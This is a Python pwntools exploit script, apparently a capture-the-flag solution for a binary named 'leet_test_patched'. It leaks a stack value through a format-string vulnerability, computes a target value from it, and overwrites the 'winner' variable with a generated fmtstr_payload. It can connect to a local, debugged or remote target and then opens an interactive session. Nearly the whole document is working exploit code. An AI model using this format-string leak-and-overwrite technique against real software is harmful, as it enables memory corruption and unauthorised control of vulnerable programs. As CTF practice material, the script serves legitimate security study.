#!/usr/bin/env python3

from pwn import *

e = ELF("./leet_test_patched")
# libc = ELF('./libc.so.6')
# rop = ROP(e)

context.binary = e
context.terminal = ['tmux', 'split', '-h']
# context.log_level = 'debug'


def conn():
    if args.LOCAL:
        # Use PTY (Pseudo terminal) to avoid some stdin/out buffer issue, e.g. HTB Jeeves
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
    elif args.GDB:
        r = gdb.debug([e.path], '''
                      b *(main+0xd2)
                      c
                      ''', stdin=process.PTY, stdout=process.PTY)
    elif args.GDB_ATTACH:
        r = process([e.path], stdin=process.PTY, stdout=process.PTY)
        gdb.attach(r, gdbscript='''
                      b *(main)
                      c
                   ''')
    elif args.REMOTE:
        ip, port = args.REMOTE.split(':')
        r = remote(ip, port)
    else:
        error('unknown running mode for the script')

    return r


def main():
    r = conn()

    # Just FSB + some math

    # Used this to locate the offset
    # r.sendlineafter(b':', b'AAAAAAAA|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p|%p')
    r.sendlineafter(b':', b'%7$p')
    data = r.recvline()
    match = re.search(rb'0x[0-9a-f]+', data)
    info(f'data is {data}')
    info(f'matched result is {match.group(0)}')
    random_value = int(match.group(0), 16) >> 32
    info(f'Got the random value is {hex(random_value)}')
    multiply_result = (random_value * 0x1337c0de) & 0xffffffff
    info(f'The target multiplied result is {hex(multiply_result)}')
    writes = {
            e.sym.winner: multiply_result,
            }
    offset = 10
    payload = fmtstr_payload(offset, writes)
    r.sendlineafter(b':', payload)

    r.interactive()

if __name__ == "__main__":
    main()
